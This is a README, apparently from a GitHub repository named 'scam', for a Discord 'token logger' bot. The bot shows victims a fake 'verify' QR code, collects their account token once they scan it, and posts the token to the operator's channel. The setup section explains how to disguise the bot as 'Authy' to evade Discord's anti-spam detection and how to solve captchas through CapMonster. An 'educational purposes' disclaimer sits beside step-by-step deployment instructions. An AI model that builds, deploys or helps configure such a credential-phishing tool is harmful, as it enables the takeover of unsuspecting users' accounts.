[![token logger video](https://i.imgur.com/AgWzkGt.png)](https://youtu.be/RpUv6K3UGYI)

## Features

- **Se ve exactamente como un bot real.** (cuando se configura eficientemente)
- **memoria eficiente.** (no usa chromedriver.exe o cualquier buscador)
- **muy estable y robusto.** (crasheos y bugs minimos)
- **el único metodo funcional** (que no usa chromedriver.exe)

## Disclaimers

- Este es un bot que no está afiliado a ninguno de los equipos de Discord o Discord Inc.
- Esto fue hecho con fines educativos. No está destinado a ser utilizado con fines maliciosos.
- Cualquier uso de este bot es bajo su propio riesgo. Ni yo ni tfa nos hacemos responsable de los daños que puedan ocurrir.
- Debe tener una cuenta <a href="https://capmonster.cloud">CapMonster</a> con fondos para un rendimiento óptimo.

## How it works

- El bot usa un socket web para conectarse a la API de Discord para recuperar una sesión de inicio de sesión.
- La sesión de inicio de sesión luego envía al bot una URL para generar un código QR para que el usuario lo escanee.
- Después de que el usuario escanee el código QR, el bot recuperará el token y lo enviará a un canal.

## Setup

- **Install Prerequisites** You will need these to be able to run the discord bot.
  - [Node LTS](https://nodejs.org/en/)
  - [Git](https://git-scm.com/downloads)
- **Clone the Repository and Install Dependancies**
  - `git clone https://github.com/ulnk/scam.git`
  - `npm install`
- **Create a new Discord Bot**
  - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
    - https://discord.dev **Bot** > **Privileged Gateway Intents**
  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile). To fit with the profile, rename the bot to `Authy` and set the profile picture to the one provided.
  - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
    - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configure the Project**
  - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
  - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
- **Start the bot**
  - `npm run start`
  - Once the bot is active, use the command `/spawn` to spawn the verify message.

(_single executable file coming soon_)

### Libraries Used

- **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
- **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
- **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">

https://discord.gg/wKn7VJ5R support server
